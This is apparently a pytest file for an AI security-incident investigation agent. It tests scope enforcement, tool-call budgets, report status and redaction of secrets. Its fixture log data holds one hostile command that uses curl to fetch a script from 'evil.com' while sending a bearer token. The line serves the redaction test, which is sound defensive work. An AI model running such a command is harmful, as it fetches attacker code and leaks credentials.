import pytest
from aegis_agent.schemas import (
    IncidentInvestigationInput,
    AlertInput,
    EntityContext,
    LogEventInput,
    SeverityLevel,
    AnalysisStatus,
    ToolCallRequest,
)
from aegis_agent.tools import BackendGatekeeper
from aegis_agent.providers import MockLLMProvider
from aegis_agent.investigator import RuntimeMonitorInvestigator


@pytest.fixture
def base_gatekeeper():
    evidence_db = [
        {
            "evidence_id": "EVT-AUTH-201",
            "source_type": "authentication_log",
            "source_ref": "auth_collector",
            "host_id": "srv-prod-01",
            "observed_at": "2026-11-01T10:02:15Z",
            "collected_at": "2026-11-01T10:02:20Z",
            "event_type": "auth_success",
            "data": {"source_ip": "198.51.100.24", "user": "admin"},
        },
        {
            "evidence_id": "EVT-PROC-301",
            "source_type": "process_activity",
            "source_ref": "auditd",
            "host_id": "srv-prod-01",
            "observed_at": "2026-11-01T10:03:00Z",
            "collected_at": "2026-11-01T10:03:05Z",
            "event_type": "process_execution",
            "data": {"command_line": "curl -H 'Authorization: Bearer my_secret_token' https://evil.com/run.sh"},
        },
    ]
    return BackendGatekeeper(
        investigation_id="INV-001",
        alert_id="ALT-001",
        authorized_host_id="srv-prod-01",
        alert_timestamp="2026-11-01T10:00:00Z",
        evidence_db=evidence_db,
    )


def test_t01_brute_force_with_success(base_gatekeeper):
    incident = IncidentInvestigationInput(
        incident_id="INC-001",
        alert=AlertInput(
            alert_id="ALT-001",
            rule_id="RULE-AUTH-01",
            rule_name="Multiple Failed Login",
            severity=SeverityLevel.HIGH,
            timestamp="2026-11-01T10:00:00Z",
        ),
        entities=EntityContext(source_ip="198.51.100.24", target_user="admin", target_host="srv-prod-01"),
        logs=[
            LogEventInput(
                event_id="EVT-AUTH-101",
                timestamp="2026-11-01T10:00:01Z",
                event_type="auth_failure",
                source_ip="198.51.100.24",
                user="admin",
            ),
            LogEventInput(
                event_id="EVT-AUTH-102",
                timestamp="2026-11-01T10:00:05Z",
                event_type="auth_failure",
                source_ip="198.51.100.24",
                user="admin",
            ),
        ],
    )

    tool_req = ToolCallRequest(
        tool_call_id="call-01",
        investigation_id="INV-001",
        alert_id="ALT-001",
        tool_name="get_related_auth_events",
        parameters={"limit": 10},
    )

    investigator = RuntimeMonitorInvestigator(
        llm_provider=MockLLMProvider(),
        gatekeeper=base_gatekeeper,
    )

    report = investigator.run_investigation(incident, [tool_req])
    assert report.analysis_status == AnalysisStatus.COMPLETED
    assert report.severity == SeverityLevel.HIGH
    assert len(report.timeline) > 0


def test_t03_normal_login_activity():
    gatekeeper = BackendGatekeeper(
        investigation_id="INV-002",
        alert_id="ALT-002",
        authorized_host_id="srv-prod-01",
        alert_timestamp="2026-11-01T10:00:00Z",
        evidence_db=[],
    )
    incident = IncidentInvestigationInput(
        incident_id="INC-002",
        alert=AlertInput(
            alert_id="ALT-002",
            rule_id="RULE-LOGIN-INFO",
            rule_name="Standard User Login",
            severity=SeverityLevel.INFORMATIONAL,
            timestamp="2026-11-01T10:00:00Z",
        ),
        entities=EntityContext(source_ip="10.0.1.20", target_user="dias", target_host="srv-prod-01"),
        logs=[
            LogEventInput(
                event_id="EVT-AUTH-001",
                timestamp="2026-11-01T10:00:01Z",
                event_type="auth_success",
                source_ip="10.0.1.20",
                user="dias",
            )
        ],
    )

    investigator = RuntimeMonitorInvestigator(
        llm_provider=MockLLMProvider(),
        gatekeeper=gatekeeper,
    )
    report = investigator.run_investigation(incident)
    assert report.analysis_status == AnalysisStatus.COMPLETED
    assert "konsisten dengan pola normal" in report.incident_summary


def test_t05_missing_evidence_insufficient_data():
    gatekeeper = BackendGatekeeper(
        investigation_id="INV-003",
        alert_id="ALT-003",
        authorized_host_id="srv-prod-01",
        alert_timestamp="2026-11-01T10:00:00Z",
        evidence_db=[],
    )
    incident = IncidentInvestigationInput(
        incident_id="INC-003",
        alert=AlertInput(
            alert_id="ALT-003",
            rule_id="RULE-EMPTY",
            rule_name="Alert With No Logs",
            severity=SeverityLevel.HIGH,
            timestamp="2026-11-01T10:00:00Z",
        ),
        entities=EntityContext(target_host="srv-prod-01"),
        logs=[],  # Empty
    )

    investigator = RuntimeMonitorInvestigator(
        llm_provider=MockLLMProvider(),
        gatekeeper=gatekeeper,
    )
    report = investigator.run_investigation(incident)
    assert report.analysis_status == AnalysisStatus.INSUFFICIENT_DATA
    assert len(report.missing_information) > 0


def test_gatekeeper_unauthorized_context_shift(base_gatekeeper):
    # Try querying another host
    req = ToolCallRequest(
        tool_call_id="call-bad-01",
        investigation_id="INV-001",
        alert_id="ALT-001",
        tool_name="get_related_auth_events",
        parameters={"target_host": "unauthorized-db-srv"},
    )
    result = base_gatekeeper.execute_tool(req)
    assert result.status == "rejected"
    assert result.error_code == "UNAUTHORIZED_CONTEXT_SHIFT"


def test_gatekeeper_budget_exceeded(base_gatekeeper):
    base_gatekeeper.max_tool_calls = 1
    req = ToolCallRequest(
        tool_call_id="call-01",
        investigation_id="INV-001",
        alert_id="ALT-001",
        tool_name="get_related_auth_events",
        parameters={},
    )
    res1 = base_gatekeeper.execute_tool(req)
    assert res1.status == "success"

    res2 = base_gatekeeper.execute_tool(req)
    assert res2.status == "rejected"
    assert res2.error_code == "TOOL_BUDGET_EXCEEDED"


def test_gatekeeper_command_redaction(base_gatekeeper):
    req = ToolCallRequest(
        tool_call_id="call-proc-01",
        investigation_id="INV-001",
        alert_id="ALT-001",
        tool_name="get_process_activity",
        parameters={},
    )
    result = base_gatekeeper.execute_tool(req)
    assert result.status == "success"
    cmd = result.events[0].data["command_line"]
    assert "[REDACTED]" in cmd
    assert "my_secret_token" not in cmd

